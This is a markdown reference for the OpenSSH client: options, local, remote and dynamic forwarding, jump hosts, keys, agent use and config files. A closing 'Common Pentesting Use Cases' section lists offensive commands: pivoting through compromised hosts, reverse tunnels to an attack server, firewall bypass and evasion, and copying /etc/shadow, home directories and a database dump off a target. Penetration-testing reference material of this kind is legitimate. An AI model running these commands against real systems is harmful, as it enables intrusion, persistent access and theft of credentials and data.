---
title: "SSH Official Documentation"
category: "tool"
tags: ["remote-access", "tunneling", "port-forwarding", "network", "encryption", "openssh"]
last_updated: 2025-12-27
---

# SSH Official Documentation

Comprehensive reference for OpenSSH (ssh) based on official man pages and OpenSSH documentation.

## Table of Contents

- [Overview](#overview)
- [Synopsis](#synopsis)
- [Key Options Reference](#key-options-reference)
  - [Connection Options](#connection-options)
  - [Authentication Options](#authentication-options)
  - [Forwarding Options](#forwarding-options)
  - [Session Options](#session-options)
  - [Debugging Options](#debugging-options)
- [Tunneling and Port Forwarding](#tunneling-and-port-forwarding)
  - [Local Port Forwarding (-L)](#local-port-forwarding--l)
  - [Remote Port Forwarding (-R)](#remote-port-forwarding--r)
  - [Dynamic SOCKS Proxy (-D)](#dynamic-socks-proxy--d)
  - [ProxyJump (-J)](#proxyjump--j)
  - [VPN Tunneling (-w)](#vpn-tunneling--w)
- [Key-Based Authentication](#key-based-authentication)
  - [Key Types and Algorithms](#key-types-and-algorithms)
  - [Key Generation](#key-generation)
  - [Key Management](#key-management)
  - [SSH Agent](#ssh-agent)
  - [Certificate Authentication](#certificate-authentication)
- [Configuration File Usage](#configuration-file-usage)
  - [Configuration File Locations](#configuration-file-locations)
  - [Configuration File Format](#configuration-file-format)
  - [Host and Match Blocks](#host-and-match-blocks)
  - [Common Configuration Options](#common-configuration-options)
- [Authentication Methods](#authentication-methods)
- [Escape Characters](#escape-characters)
- [Important Files](#important-files)
- [Environment Variables](#environment-variables)
- [Common Pentesting Use Cases](#common-pentesting-use-cases)
- [Usage Examples](#usage-examples)

## Overview

SSH (Secure Shell) is an OpenSSH remote login client for secure encrypted communications between two untrusted hosts over an insecure network. It provides:

- Secure remote login and command execution
- Encrypted communications using modern cryptographic algorithms
- Multiple authentication methods (public key, password, certificate, GSSAPI)
- TCP port forwarding (local, remote, dynamic)
- UNIX-domain socket forwarding
- X11 forwarding for graphical applications
- Agent forwarding for transparent key management
- VPN tunneling via tun/tap devices

The SSH protocol is defined in RFC 4251-4256 and provides cryptographic authentication and encryption for all communications.

## Synopsis

```
ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
    [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
    [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
    [-J destination] [-L address] [-l login_name] [-m mac_spec]
    [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
    [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination
    [command [argument ...]]
```

The destination may be specified as:
- `[user@]hostname`
- `ssh://[user@]hostname[:port]`

## Key Options Reference

### Connection Options

| Option | Description |
|--------|-------------|
| `-4` | Force IPv4 addresses only |
| `-6` | Force IPv6 addresses only |
| `-B bind_interface` | Bind to specific network interface before connecting |
| `-b bind_address` | Use specified local address as source of connection |
| `-F configfile` | Specify alternative configuration file (default: `~/.ssh/config`) |
| `-l login_name` | Specify login username on remote machine |
| `-o option` | Set configuration option in command-line format |
| `-p port` | Port to connect to on remote host (default: 22) |
| `-W host:port` | Forward stdin/stdout to host:port over secure channel |

### Authentication Options

| Option | Description |
|--------|-------------|
| `-A` | Enable forwarding of authentication agent connection |
| `-a` | Disable forwarding of authentication agent connection |
| `-i identity_file` | Select identity file (private key) for public key authentication |
| `-I pkcs11` | Specify PKCS#11 shared library for hardware token authentication |
| `-K` | Enable GSSAPI-based authentication and credential forwarding |
| `-k` | Disable GSSAPI credential forwarding |

### Forwarding Options

| Option | Description |
|--------|-------------|
| `-D [bind_address:]port` | Dynamic application-level port forwarding (SOCKS proxy) |
| `-g` | Allow remote hosts to connect to local forwarded ports |
| `-J destination` | Connect via jump host (ProxyJump) |
| `-L [bind_address:]port:host:hostport` | Local port forwarding |
| `-R [bind_address:]port:host:hostport` | Remote port forwarding |
| `-w local_tun[:remote_tun]` | Request tunnel device forwarding (VPN) |
| `-X` | Enable X11 forwarding |
| `-x` | Disable X11 forwarding |
| `-Y` | Enable trusted X11 forwarding (bypasses SECURITY extension) |

### Session Options

| Option | Description |
|--------|-------------|
| `-C` | Request compression of all data |
| `-c cipher_spec` | Select cipher specification for encrypting session |
| `-e escape_char` | Set escape character (default: `~`) |
| `-f` | Go to background before command execution |
| `-G` | Print configuration and exit (for debugging) |
| `-M` | Place client in master mode for connection sharing |
| `-m mac_spec` | Specify MAC algorithms in order of preference |
| `-N` | Do not execute remote command (useful for port forwarding only) |
| `-n` | Redirect stdin from /dev/null (for background operation) |
| `-O ctl_cmd` | Control multiplexing master process |
| `-q` | Quiet mode (suppress warnings and diagnostics) |
| `-S ctl_path` | Specify control socket for connection sharing |
| `-s` | Request subsystem invocation on remote system |
| `-T` | Disable pseudo-terminal allocation |
| `-t` | Force pseudo-terminal allocation |

### Debugging Options

| Option | Description |
|--------|-------------|
| `-E log_file` | Append debug logs to log file instead of stderr |
| `-Q query_option` | Query supported algorithms (cipher, mac, kex, key, sig) |
| `-v` | Verbose mode (use -vv or -vvv for more verbosity) |
| `-V` | Display version number and exit |
| `-y` | Send log information using syslog |

## Tunneling and Port Forwarding

### Local Port Forwarding (-L)

Local port forwarding binds a port on the local machine and forwards connections through the SSH server to a destination host.

**Syntax:**
```
-L [bind_address:]port:host:hostport
-L [bind_address:]port:remote_socket
-L local_socket:host:hostport
-L local_socket:remote_socket
```

**How It Works:**
1. SSH allocates a socket to listen on the specified local port
2. When a connection is made to that port, the connection is forwarded over the secure channel
3. A connection is made to `host:hostport` from the remote machine

**Examples:**
```bash
# Forward local port 8080 to remote localhost:80
ssh -L 8080:localhost:80 user@server

# Forward local port 3306 to internal database server
ssh -L 3306:db.internal:3306 user@jumphost

# Bind to all interfaces (allow external connections)
ssh -L 0.0.0.0:8080:target:80 user@server

# Forward local Unix socket to remote port
ssh -L /tmp/local.sock:localhost:5432 user@server

# Multiple forwards
ssh -L 8080:web:80 -L 3306:db:3306 -L 5432:postgres:5432 user@server
```

**Binding Behavior:**
- `localhost` - Listening port bound for local use only (default)
- Empty address or `*` - Port available from all interfaces
- Explicit address - Bind to specific interface

### Remote Port Forwarding (-R)

Remote port forwarding binds a port on the SSH server and forwards connections back to the local machine or another host accessible from the local machine.

**Syntax:**
```
-R [bind_address:]port:host:hostport
-R [bind_address:]port:local_socket
-R remote_socket:host:hostport
-R remote_socket:local_socket
-R [bind_address:]port
```

**How It Works:**
1. SSH allocates a socket on the remote server to listen on the specified port
2. When a connection is made to that port on the server, it is forwarded over the secure channel
3. A connection is made from the local machine to the specified destination

**Examples:**
```bash
# Forward remote port 8080 to local port 80
ssh -R 8080:localhost:80 user@server

# Dynamic port allocation (server assigns port)
ssh -R 0:localhost:22 user@server
# Server reports: "Allocated port XXXXX for remote forward"

# Bind to all interfaces on remote server
ssh -R 0.0.0.0:8080:localhost:80 user@server
# Note: Requires GatewayPorts option enabled on server

# SOCKS proxy on remote server
ssh -R 1080 user@server
# Creates SOCKS 4/5 proxy on server:1080
```

**Server Configuration for Remote Forwarding:**
```
# /etc/ssh/sshd_config
GatewayPorts yes              # Allow binding to all interfaces
GatewayPorts clientspecified  # Client controls bind address
```

### Dynamic SOCKS Proxy (-D)

Dynamic forwarding creates a SOCKS4/SOCKS5 proxy server on the local machine. Applications using the proxy can reach any destination accessible from the SSH server.

**Syntax:**
```
-D [bind_address:]port
```

**Examples:**
```bash
# Create SOCKS proxy on port 1080
ssh -D 1080 user@server

# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@server

# Background with no shell
ssh -fN -D 1080 user@server

# With compression for slow connections
ssh -C -D 1080 user@server
```

**Using the SOCKS Proxy:**
```bash
# curl with SOCKS5
curl --socks5 127.0.0.1:1080 http://internal-site/

# curl with DNS resolution through proxy
curl --socks5-hostname 127.0.0.1:1080 http://internal-site/

# Firefox: network.proxy.socks = 127.0.0.1, port 1080
# Chrome: --proxy-server="socks5://127.0.0.1:1080"

# nmap through SOCKS
nmap -sT -Pn --proxy socks4://127.0.0.1:1080 192.168.1.0/24
```

### ProxyJump (-J)

ProxyJump provides a clean mechanism to connect through one or more intermediate (jump) hosts.

**Syntax:**
```
-J [user@]host[:port]
-J user1@host1[:port1],user2@host2[:port2],...
```

**How It Works:**
1. SSH connects to the first jump host
2. Establishes TCP forwarding to the next host (or final destination)
3. Repeats for each jump host in the chain
4. Final connection is made to the destination

**Examples:**
```bash
# Single jump host
ssh -J jumpuser@bastion.example.com user@internal.target

# Multiple jump hosts (comma-separated)
ssh -J user1@jump1,user2@jump2 user@final-target

# Jump host on non-standard port
ssh -J user@bastion:2222 user@internal.target

# With identity files
ssh -J bastion -i ~/.ssh/internal_key user@internal
```

**Equivalent ProxyCommand:**
```bash
# ProxyJump is a shortcut for:
ssh -o ProxyCommand="ssh -W %h:%p bastion" user@target
```

**SSH Config Example:**
```
Host bastion
    HostName bastion.example.com
    User jumpuser

Host internal-*
    ProxyJump bastion

Host internal-web
    HostName 10.0.1.10
```

### VPN Tunneling (-w)

SSH supports Layer 2/3 VPN tunneling using tun/tap devices.

**Syntax:**
```
-w local_tun[:remote_tun]
```

**Example Setup:**
```bash
# On client:
ssh -f -w 0:1 192.168.1.15 true
ifconfig tun0 10.1.1.1 10.1.1.2 netmask 255.255.255.252
route add 10.0.99.0/24 10.1.1.2

# On server:
ifconfig tun1 10.1.1.2 10.1.1.1 netmask 255.255.255.252
route add 10.0.50.0/24 10.1.1.1
```

**Server Configuration:**
```
# /etc/ssh/sshd_config
PermitTunnel point-to-point  # or "ethernet" for Layer 2
```

## Key-Based Authentication

### Key Types and Algorithms

SSH supports multiple key types with varying security levels:

| Key Type | Algorithm | Security | Recommendation |
|----------|-----------|----------|----------------|
| Ed25519 | EdDSA | Excellent | Recommended for most uses |
| ECDSA | ECDSA (P-256, P-384, P-521) | Good | Alternative to Ed25519 |
| RSA | RSA (2048, 4096 bit) | Good with 4096 bits | Widely compatible |
| DSA | DSA | Deprecated | Avoid |

**Default Key Locations:**
- `~/.ssh/id_ed25519` / `~/.ssh/id_ed25519.pub`
- `~/.ssh/id_ecdsa` / `~/.ssh/id_ecdsa.pub`
- `~/.ssh/id_rsa` / `~/.ssh/id_rsa.pub`
- `~/.ssh/id_dsa` / `~/.ssh/id_dsa.pub` (deprecated)

### Key Generation

```bash
# Generate Ed25519 key (recommended)
ssh-keygen -t ed25519 -C "user@hostname"

# Generate Ed25519 with custom filename
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_custom -C "comment"

# Generate RSA 4096-bit key
ssh-keygen -t rsa -b 4096 -C "user@hostname"

# Generate ECDSA key
ssh-keygen -t ecdsa -b 521 -C "user@hostname"

# Generate key with no passphrase (for automation)
ssh-keygen -t ed25519 -f ~/.ssh/automation_key -N ""

# Generate key with strong passphrase
ssh-keygen -t ed25519 -f ~/.ssh/secure_key -N "strong_passphrase"
```

### Key Management

```bash
# Copy public key to remote server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server

# Manual key installation
cat ~/.ssh/id_ed25519.pub | ssh user@server 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'

# View key fingerprint
ssh-keygen -l -f ~/.ssh/id_ed25519.pub

# View key fingerprint in different format
ssh-keygen -l -f ~/.ssh/id_ed25519.pub -E md5

# Change key passphrase
ssh-keygen -p -f ~/.ssh/id_ed25519

# Extract public key from private key
ssh-keygen -y -f ~/.ssh/id_ed25519 > ~/.ssh/id_ed25519.pub

# Convert key format (OpenSSH to PEM)
ssh-keygen -p -m PEM -f ~/.ssh/id_rsa
```

### SSH Agent

The SSH agent holds private keys in memory for passwordless authentication:

```bash
# Start SSH agent
eval $(ssh-agent -s)

# Add key to agent
ssh-add ~/.ssh/id_ed25519

# Add key with lifetime (expires after 1 hour)
ssh-add -t 3600 ~/.ssh/id_ed25519

# Add key requiring confirmation for each use
ssh-add -c ~/.ssh/id_ed25519

# List keys in agent
ssh-add -l

# Remove specific key
ssh-add -d ~/.ssh/id_ed25519

# Remove all keys
ssh-add -D

# Lock agent with password
ssh-add -x

# Unlock agent
ssh-add -X
```

**Automatic Key Addition (ssh_config):**
```
# Add keys to agent automatically
AddKeysToAgent yes

# With confirmation required
AddKeysToAgent confirm
```

### Certificate Authentication

SSH certificates provide scalable authentication without distributing individual public keys:

```bash
# Create CA key
ssh-keygen -t ed25519 -f ca_key -C "CA Key"

# Sign user key with CA
ssh-keygen -s ca_key -I "user_cert" -n username -V +52w user_key.pub

# Sign host key with CA
ssh-keygen -s ca_key -I "host_cert" -h -n hostname -V +52w host_key.pub

# View certificate details
ssh-keygen -L -f user_key-cert.pub
```

## Configuration File Usage

### Configuration File Locations

SSH reads configuration in this order (first value wins):

1. Command-line options (`-o`)
2. User configuration file (`~/.ssh/config`)
3. System-wide configuration file (`/etc/ssh/ssh_config`)

### Configuration File Format

- One keyword-argument pair per line
- Lines starting with `#` are comments
- Keywords are case-insensitive
- Arguments are case-sensitive
- Arguments with spaces must be quoted

```
# Example format
Host server
    HostName server.example.com
    User admin
    Port 2222
    IdentityFile ~/.ssh/server_key
```

### Host and Match Blocks

**Host Blocks:**
```
# Specific host
Host webserver
    HostName 192.168.1.100
    User www

# Pattern matching
Host *.example.com
    User admin
    IdentityFile ~/.ssh/example_key

# Negation
Host * !bastion
    ProxyJump bastion

# Global defaults (must be last)
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

**Match Blocks:**
```
# Match by hostname
Match host 192.168.*
    User localadmin

# Match by user
Match user deploy
    IdentityFile ~/.ssh/deploy_key

# Match by command execution
Match exec "test -f ~/.ssh/corporate_key"
    IdentityFile ~/.ssh/corporate_key

# Combine criteria
Match host *.internal user admin
    ForwardAgent yes
```

### Common Configuration Options

```
# ~/.ssh/config

# Global defaults
Host *
    # Connection keepalive
    ServerAliveInterval 60
    ServerAliveCountMax 3

    # Security settings
    HashKnownHosts yes

    # Compression for slow links
    Compression yes

    # Reuse connections
    ControlMaster auto
    ControlPath ~/.ssh/sockets/%r@%h-%p
    ControlPersist 600

# Jump/Bastion host
Host bastion
    HostName bastion.example.com
    User jumpuser
    IdentityFile ~/.ssh/bastion_key
    DynamicForward 1080

# Internal servers via bastion
Host internal-*
    ProxyJump bastion
    User admin

Host internal-web
    HostName 10.0.1.10
    LocalForward 8080 localhost:80

Host internal-db
    HostName 10.0.1.20
    LocalForward 3306 localhost:3306

# Legacy system with weak crypto
Host legacy-server
    HostName legacy.example.com
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    KexAlgorithms +diffie-hellman-group14-sha1
```

**Key Configuration Options:**

| Option | Description |
|--------|-------------|
| `Host` | Restricts following options to matching hosts |
| `Match` | Conditional configuration based on criteria |
| `HostName` | Actual hostname to connect to |
| `User` | Default username |
| `Port` | Port number (default: 22) |
| `IdentityFile` | Private key file path |
| `IdentitiesOnly` | Only use specified identity files |
| `ProxyJump` | Jump host(s) for connection |
| `ProxyCommand` | Command to establish connection |
| `LocalForward` | Local port forwarding |
| `RemoteForward` | Remote port forwarding |
| `DynamicForward` | SOCKS proxy port |
| `ForwardAgent` | Enable agent forwarding |
| `ForwardX11` | Enable X11 forwarding |
| `Compression` | Enable compression |
| `ServerAliveInterval` | Keepalive interval in seconds |
| `ServerAliveCountMax` | Max keepalive failures before disconnect |
| `ControlMaster` | Enable connection multiplexing |
| `ControlPath` | Path for control socket |
| `ControlPersist` | Keep master connection open |
| `StrictHostKeyChecking` | Host key verification behavior |
| `UserKnownHostsFile` | Known hosts file location |
| `BatchMode` | Disable interactive prompts |

## Authentication Methods

SSH supports multiple authentication methods (in default order):

1. **GSSAPI-based authentication** - Kerberos/SPNEGO for enterprise SSO
2. **Host-based authentication** - Trust based on client hostname
3. **Public key authentication** - Cryptographic key pairs (recommended)
4. **Keyboard-interactive** - Challenge-response (PAM, 2FA)
5. **Password authentication** - Simple password prompt

**Controlling Authentication Order:**
```bash
# Force password authentication
ssh -o PreferredAuthentications=password user@host

# Force public key only
ssh -o PreferredAuthentications=publickey user@host

# Try multiple methods in order
ssh -o PreferredAuthentications=publickey,keyboard-interactive,password user@host
```

## Escape Characters

When connected with a pseudo-terminal, SSH supports escape sequences (must follow newline):

| Escape | Description |
|--------|-------------|
| `~.` | Disconnect |
| `~^Z` | Background SSH |
| `~#` | List forwarded connections |
| `~&` | Background at logout (wait for forwards to close) |
| `~?` | Display escape character help |
| `~B` | Send BREAK to remote system |
| `~C` | Open command line (add/remove forwards dynamically) |
| `~R` | Request rekeying |
| `~V` | Decrease verbosity |
| `~v` | Increase verbosity |
| `~~` | Send literal tilde |

**Dynamic Forwarding with ~C:**
```
# While connected, press Enter then ~C
ssh> -L 8080:localhost:80    # Add local forward
ssh> -R 9090:localhost:22    # Add remote forward
ssh> -D 1080                 # Add SOCKS proxy
ssh> -KL 8080                # Cancel local forward
ssh> -KR 9090                # Cancel remote forward
ssh> -KD 1080                # Cancel dynamic forward
```

## Important Files

### User Files

| File | Description |
|------|-------------|
| `~/.ssh/` | User SSH configuration directory |
| `~/.ssh/config` | User configuration file (mode 600) |
| `~/.ssh/known_hosts` | Known host keys database |
| `~/.ssh/authorized_keys` | Authorized public keys for incoming connections |
| `~/.ssh/id_ed25519` | Ed25519 private key (mode 600) |
| `~/.ssh/id_ed25519.pub` | Ed25519 public key |
| `~/.ssh/id_rsa` | RSA private key (mode 600) |
| `~/.ssh/id_rsa.pub` | RSA public key |
| `~/.ssh/environment` | Additional environment variables |
| `~/.ssh/rc` | Commands executed on login |

### System Files

| File | Description |
|------|-------------|
| `/etc/ssh/ssh_config` | System-wide client configuration |
| `/etc/ssh/ssh_known_hosts` | System-wide known hosts |
| `/etc/ssh/sshd_config` | SSH daemon configuration |
| `/etc/ssh/ssh_host_*_key` | Host private keys |
| `/etc/ssh/ssh_host_*_key.pub` | Host public keys |

## Environment Variables

| Variable | Description |
|----------|-------------|
| `SSH_AUTH_SOCK` | Path to authentication agent socket |
| `SSH_CONNECTION` | Client/server IP addresses and ports |
| `SSH_ORIGINAL_COMMAND` | Original command for forced commands |
| `SSH_TTY` | Path to allocated TTY device |
| `SSH_TUNNEL` | Tunnel interface names |
| `SSH_ASKPASS` | Program for passphrase prompts |
| `SSH_ASKPASS_REQUIRE` | Control askpass usage (never/prefer/force) |

## Common Pentesting Use Cases

### Initial Access and Enumeration

```bash
# Connect with verbose output for debugging
ssh -v user@target

# Test authentication methods
ssh -o PreferredAuthentications=none user@target 2>&1 | grep -i auth

# Banner grabbing
nc -v target 22
echo "SSH-2.0-Test" | nc target 22

# Check supported algorithms
ssh -Q cipher
ssh -Q mac
ssh -Q kex
ssh -Q key
```

### Pivoting Through Compromised Hosts

```bash
# Create SOCKS proxy for network access
ssh -D 1080 -fN user@compromised

# Access internal services
curl --socks5-hostname 127.0.0.1:1080 http://internal.corp

# Forward specific services
ssh -L 3389:internal-windows:3389 -fN user@compromised
xfreerdp /v:localhost:3389

# Chain through multiple hosts
ssh -J user1@dmz,user2@app user3@database
```

### Reverse Tunnels for Callbacks

```bash
# Expose attack server's handler through compromised host
ssh -R 4444:localhost:4444 -fN user@attack-server

# Persistent reverse tunnel with autossh
autossh -M 0 -fN -R 2222:localhost:22 user@attack-server \
    -o ServerAliveInterval=30 -o ServerAliveCountMax=3

# Reverse SOCKS proxy
ssh -R 1080 -fN user@attack-server
```

### Bypassing Firewalls

```bash
# SSH over HTTP proxy
ssh -o ProxyCommand="nc -X connect -x proxy:8080 %h %p" user@target

# SSH over SOCKS proxy
ssh -o ProxyCommand="nc -X 5 -x socks:1080 %h %p" user@target

# DNS tunneling with SSH
ssh -o ProxyCommand="dns2tcpc -z dns.tunnel.com %h" user@target
```

### Post-Exploitation

```bash
# Forward local database for credential extraction
ssh -L 5432:localhost:5432 -fN user@target
pg_dump -h localhost -U postgres secrets > dump.sql

# Access internal web admin panels
ssh -L 8080:localhost:8080 -fN user@target
# Browse to http://localhost:8080

# Extract files via SCP
scp -i key user@target:/etc/shadow ./
scp -r -i key user@target:/home/ ./loot/
```

### Evasion Techniques

```bash
# Use non-standard port
ssh -p 443 user@target

# Reduce traffic patterns
ssh -o ServerAliveInterval=300 user@target

# Disable strict host key checking (CTFs only)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@target
```

## Usage Examples

### Basic Connections

```bash
# Standard connection
ssh user@hostname

# Non-standard port
ssh -p 2222 user@hostname

# With specific identity file
ssh -i ~/.ssh/custom_key user@hostname

# URI format
ssh ssh://user@hostname:2222

# Execute command and exit
ssh user@hostname 'cat /etc/passwd'

# Allocate PTY for interactive command
ssh -t user@hostname 'sudo bash'
```

### Port Forwarding Examples

```bash
# Access remote web server locally
ssh -L 8080:localhost:80 -fN user@webserver
# Browse to http://localhost:8080

# Access internal database through jump host
ssh -L 3306:db.internal:3306 -fN user@jumphost
mysql -h 127.0.0.1 -u dbuser -p

# Expose local dev server to remote network
ssh -R 8080:localhost:3000 -fN user@server
# Remote users access server:8080

# Create SOCKS proxy for browsing
ssh -D 1080 -fN user@server
# Configure browser to use SOCKS5 127.0.0.1:1080
```

### Jump Host Examples

```bash
# Single jump
ssh -J bastion user@internal

# Multiple jumps
ssh -J jump1,jump2 user@target

# Jump with different users/ports
ssh -J admin@bastion:2222 root@internal:22
```

### Connection Multiplexing

```bash
# Start master connection
ssh -M -S /tmp/ssh-socket user@host

# Reuse connection
ssh -S /tmp/ssh-socket user@host

# Check connection status
ssh -S /tmp/ssh-socket -O check user@host

# Close master connection
ssh -S /tmp/ssh-socket -O exit user@host
```

### Debugging Connections

```bash
# Verbose output
ssh -v user@host

# More verbose
ssh -vv user@host

# Maximum verbosity
ssh -vvv user@host

# Print configuration for host
ssh -G hostname

# Test specific algorithm support
ssh -Q cipher
ssh -o Ciphers=aes256-gcm@openssh.com user@host
```

## See Also

- `ssh-keygen(1)` - Authentication key generation
- `ssh-agent(1)` - Authentication agent
- `ssh-add(1)` - Add keys to agent
- `ssh-copy-id(1)` - Install public key on server
- `scp(1)` - Secure file copy
- `sftp(1)` - Secure FTP
- `ssh_config(5)` - Client configuration
- `sshd(8)` - SSH daemon
- `sshd_config(5)` - Server configuration

## References

- [OpenSSH Manual](https://www.openssh.com/manual.html)
- [OpenSSH Portable Release](https://www.openssh.com/portable.html)
- RFC 4251 - SSH Protocol Architecture
- RFC 4252 - SSH Authentication Protocol
- RFC 4253 - SSH Transport Layer Protocol
- RFC 4254 - SSH Connection Protocol
- RFC 4255 - DNS SSHFP Resource Records
